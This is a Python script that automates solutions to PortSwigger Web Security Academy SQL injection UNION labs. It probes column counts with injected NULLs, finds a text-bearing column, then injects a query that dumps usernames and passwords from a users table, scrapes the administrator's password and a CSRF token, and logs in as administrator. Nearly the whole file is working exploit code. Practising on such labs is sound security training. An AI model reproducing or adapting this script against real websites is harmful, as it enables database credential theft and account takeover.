#!/usr/bin/env python3
import requests
import sys
from bs4 import BeautifulSoup

# Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

# API Parameters
url = 'https://abcd.web-security-academy.net/'
url = f'{url}page'
params = {'category': 'Lifestyle'}
null = ["'UNION SELECT", 'NULL', '--']
sqli = {'category': f"Lifestyle{' '.join(null)}"}

# API Request
api_session = requests.Session()
response = api_session.get(url, params=params)

if response.status_code == 404:
    sys.exit('The session you are looking for has expired')


def sqli_union_lab_1(null, sqli):
    """
    To solve the lab, perform an SQL injection UNION attack that returns an additional row containing null values.
    :param null: Copy of global null variable
    :param sqli: Copy of global sqli variable
    :return:
    """
    # Perform a new requests with sqli parameters
    lab1 = api_session.get(url, params=sqli)

    while not lab1.ok:
        # Remove '--' then add ', NULL --' until lab1.ok is True
        null.remove('--')
        null.extend([',', 'NULL', '--'])

        # Perform a new request with the updated list
        sqli['category'] = f"Lifestyle{' '.join(null)}"
        lab1 = api_session.get(url, params=sqli)

    print(f"There are {null.count('NULL')} columns")

    # Return null since it now has the amount of NULL's required to exploit the application
    return null


def sqli_union_lab_2(lab2, null, sqli):
    """
    To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value
    provided.
    :param lab2: Global response variable
    :param null: Copy of global null variable
    :param sqli: Copy of global sqli variable
    :return:
    """
    # # Parse the HTML output using Beautiful Soup to grab the secret value
    # html = BeautifulSoup(lab2.text, 'html.parser')
    # secret_string = html.find('p', {'id': 'hint'}).contents[0]
    # secret_value = re.search("['].*[']", secret_string)
    secret_value = [f"{'VULNERABLE_STRING'!r}"]

    # Perform a new request with sqli parameters
    lab2 = api_session.get(url, params=sqli)
    # Initialize column variable for accurate column count
    column = 1
    # Retrieve the location of the first 'NULL'
    step = null.index('NULL')

    while not lab2.ok:
        # Replace each NULL with the secret_value until lab2.ok is True.
        index = null.index('NULL', step)
        null[index] = secret_value[0]

        # Perform a new request with the updated parameters
        sqli['category'] = f"Lifestyle{' '.join(null)}"
        lab2 = api_session.get(url, params=sqli)

        if not lab2.ok:
            # Replace the secret_value with NULL if lab2.ok is still False
            null[index] = "NULL"
            # Increase step by 1 to find the next NULL
            step = (index + 1)
            # Increase column by 1 for accurate column count
            column += 1
    print(f'Column {column} contains inserted text')

    # Return the index where the secret value appeared within the query results
    return index


def sqli_union_lab_3(null, index, url):
    """
    To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords,
    and use the information to log in as the administrator user.
    :param null: Copy of global null variable
    :param index: Global index variable where the secret value appeared within the query results
    :param url: Global url variable
    :return:
    """
    pass


def sqli_union_lab_4(null, index, url):
    """
    To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords,
    and use the information to log in as the administrator user.
    :param null: Copy of global null variable
    :param index: Global index variable where the secret value appeared within the query results
    :param url: Global url variable
    :return:
    """
    # Insert new SQLi query where a given value will appear within the query results
    null[index] = "username || ':' || password FROM users--"
    # Remove unused NULL values
    del (null[index + 1:])

    # Perform a new request with the updated parameters. Exclude the category to return only usernames and passwords
    sqli['category'] = f"{' '.join(null)}"
    lab4 = api_session.get(url, params=sqli)

    # Parse the HTML output using Beautiful Soup and create a dictionary with username/password combinations
    html = BeautifulSoup(lab4.text, 'html.parser')
    up_combo = [up.contents[0] for up in html(['th'])]
    user_pass = dict(up.split(':') for up in up_combo)

    # Perform a GET request against /login to grab the csrfToken
    url = url.replace('/page', '/login')
    lab4 = api_session.get(url)
    html = BeautifulSoup(lab4.text, 'html.parser')
    csrfToken = html.find('input', {'name': 'csrf'})['value']

    # Authenticate using credentials scraped from the HTML output
    payload = {'username': 'administrator', 'password': user_pass['administrator'], 'csrf': csrfToken}
    lab4 = api_session.post(url, data=payload)

    return lab4

if __name__ == '__main__':
    null = sqli_union_lab_1(null=null.copy(), sqli=sqli.copy())
    index = sqli_union_lab_2(lab2=response, null=null.copy(), sqli=sqli.copy())
    # sqli_union_lab_3(null=null.copy(), index=index, url=url)
    login = sqli_union_lab_4(null=null.copy(), index=index, url=url)
